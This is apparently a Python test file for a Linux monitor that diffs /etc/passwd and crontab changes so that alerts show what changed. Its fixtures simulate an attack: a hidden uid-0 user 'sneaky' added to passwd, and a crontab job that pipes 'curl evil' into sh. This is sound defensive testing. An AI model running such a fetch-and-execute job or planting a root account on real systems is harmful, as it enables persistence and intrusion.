"""
tests/test_linux_file_diff.py, a passwd or crontab alert shows WHAT changed.

WHERE THIS CAME FROM, 2026-09-21, a real run. The owner changed /etc/passwd and the
crontab on the Linux box themselves and the Windows side caught both. Right call.
But the alert only said the hash moved, so the owner's change and an attacker adding
a user in the same minute looked exactly the same.

Now the monitor keeps the last copy and puts the added and removed lines in
the finding.

Failure cases FIRST, on purpose. The easy bug here is an empty diff that
reads like "nothing changed" when really we never had anything to compare.

No SSH and no database. The monitor's memory calls are swapped for a dict
and the remote read is swapped for a function that returns whatever text
the test wants on the box.
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

fails = []


def check(label, got, want):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: {got!r}"
          + ("" if ok else f"  (want {want!r})"))
    if not ok:
        fails.append(label)


import tools.linux_monitor as lm      # noqa: E402

# a tiny fake of the memory engine, just what these two checks touch
prefs, findings = {}, []
lm.me.get_preference = lambda k, d=None: prefs.get(k, d)
lm.me.set_preference = lambda k, v: prefs.__setitem__(k, v)
lm.me.is_dismissed = lambda *a, **k: False
lm.me.save_finding = lambda **kw: findings.append(kw)

box = {}   # path or "crontab" -> what the fake host returns


def fake_run(self, client, cmd):
    if cmd.startswith("crontab"):
        return box.get("crontab", "")
    for f in ("/etc/passwd", "/etc/sudoers"):
        if f in cmd:
            return box.get(f, "")
    return ""


mon = object.__new__(lm.LinuxMonitor)
mon.host = "192.0.2.10"
mon.session_id = "test"
lm.LinuxMonitor._run = fake_run

PW1 = "root:x:0:0:root:/root:/bin/bash\nsomeuser:x:1000:1000::/home/someuser:/bin/bash"
PW2 = PW1 + "\nsneaky:x:0:0::/root:/bin/bash"


def reset():
    prefs.clear()
    findings.clear()
    box.clear()


print("\n[1] FAILURE: no earlier copy kept, it must say so, not show an empty diff")
reset()
box["/etc/passwd"] = PW2
# A baseline from before this change shipped: hash only, no copy.
prefs["linux_monitor:192.0.2.10:hash:/etc/passwd"] = f'"{lm._sha_full(PW1)}"'
mon._check_passwd_sudoers(None)
f = findings[0] if findings else {}
raw = f.get("raw_data", {})
check("it still alerts", len(findings), 1)
check("status says no earlier copy", raw.get("diff_status"), "no_earlier_copy")
check("it does not claim any lines", (raw.get("added"), raw.get("removed")), ([], []))
check("the description says it cannot show the change",
      "cannot show what changed" in f.get("description", ""), True)
check("a copy is taken now so the next change can be shown",
      lm.json.loads(prefs.get("linux_monitor:192.0.2.10:copy:/etc/passwd", "null")), PW2)


print("\n[2] FAILURE: the kept copy does not match the baseline hash")
reset()
box["/etc/passwd"] = PW2
prefs["linux_monitor:192.0.2.10:hash:/etc/passwd"] = f'"{lm._sha_full(PW1)}"'
prefs["linux_monitor:192.0.2.10:copy:/etc/passwd"] = lm.json.dumps("something else")
mon._check_passwd_sudoers(None)
raw = findings[0]["raw_data"] if findings else {}
check("status says the copy is stale", raw.get("diff_status"), "earlier_copy_stale")
check("no lines are claimed from a copy we cannot trust",
      (raw.get("added"), raw.get("removed")), ([], []))


print("\n[3] FAILURE: an unreadable file raises nothing and stores nothing")
reset()
mon._check_passwd_sudoers(None)
check("no finding", findings, [])
check("no baseline invented", prefs, {})


print("\n[4] FAILURE: same lines in a new order is still called a change")
d = lm._what_changed("a\nb", lm._sha_full("a\nb"), "b\na", lm._sha_full)
check("status shown", d["diff_status"], "shown")
check("note says order or spacing", "order or spacing" in d["note"], True)


print("\n[5] the real case: a user was added to /etc/passwd")
reset()
box["/etc/passwd"] = PW1
mon._check_passwd_sudoers(None)
check("first read seeds quietly", findings, [])
box["/etc/passwd"] = PW2
mon._check_passwd_sudoers(None)
f = findings[0] if findings else {}
raw = f.get("raw_data", {})
check("one critical finding", (len(findings), f.get("severity")), (1, "critical"))
check("status shown", raw.get("diff_status"), "shown")
check("the added line is the new user", raw.get("added"),
      ["sneaky:x:0:0::/root:/bin/bash"])
check("nothing removed", raw.get("removed"), [])
check("the description carries the line",
      "+ sneaky:x:0:0::/root:/bin/bash" in f.get("description", ""), True)
mon._check_passwd_sudoers(None)
check("no second alert for the same change", len(findings), 1)


print("\n[6] crontab shows the new job")
reset()
box["crontab"] = "0 * * * * /usr/bin/backup"
mon._check_crontab(None)
box["crontab"] = "0 * * * * /usr/bin/backup\n*/5 * * * * curl evil | sh"
mon._check_crontab(None)
raw = findings[0]["raw_data"] if findings else {}
check("status shown", raw.get("diff_status"), "shown")
check("the added job", raw.get("added"), ["*/5 * * * * curl evil | sh"])


print("\n[7] a huge change is capped and says so")
old = "\n".join(f"u{i}:x" for i in range(5))
new = "\n".join(f"n{i}:x" for i in range(50))
d = lm._what_changed(old, lm._sha_full(old), new, lm._sha_full)
check("capped", len(d["added"]), lm.DIFF_LINE_CAP)
check("and the note admits it", "Only the first" in d["note"], True)


print("\n[8] shadow is never read")
src = (ROOT / "tools" / "linux_monitor.py").read_text(encoding="utf-8")
check("no /etc/shadow in the monitor", "/etc/shadow" in src.replace(
    "Never /etc/shadow", ""), False)


print("\n" + ("ALL PASS" if not fails else f"FAILURES: {fails}"))
sys.exit(1 if fails else 0)
